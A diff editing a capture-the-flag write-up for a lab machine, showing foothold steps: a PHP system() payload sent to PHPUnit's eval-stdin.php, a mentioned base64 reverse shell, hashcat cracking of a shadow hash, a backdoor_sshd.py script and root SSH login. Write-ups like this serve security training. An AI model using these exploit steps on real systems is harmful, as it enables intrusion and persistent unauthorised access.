@@ -33,7 +33,7 @@ nmap -Pn -sCV -p22,80 <IP>
 
 ## Foothold
 
-Send `<?php system("id"); ?>` to the endpoint and confirm execution. A base64 reverse shell avoids character issues and returns `www-data`. `/var/backups` has an `info` binary that, when analyzed, adds `<user>1` users with duplicate UID and a fixed hash to `/etc/shadow`.
+Send `<?php system("id"); ?>` to the endpoint and confirm execution. A base64 reverse shell avoids character issues and returns `www-data`. `/var/backups` has an `info` binary that, when reversed, shows a previous attacker added `<user>1` users with duplicate UID and a fixed hash to `/etc/shadow`.
 
 ```bash
 # PHPUnit
@@ -42,7 +42,8 @@ curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.p
 # hash and sshd
 hashcat -m 1800 steven1.hash rockyou.txt
 python3 backdoor_sshd.py
-ssh root@<IP>```
+ssh root@<IP>
+```
 
 ## Lateral movement
 
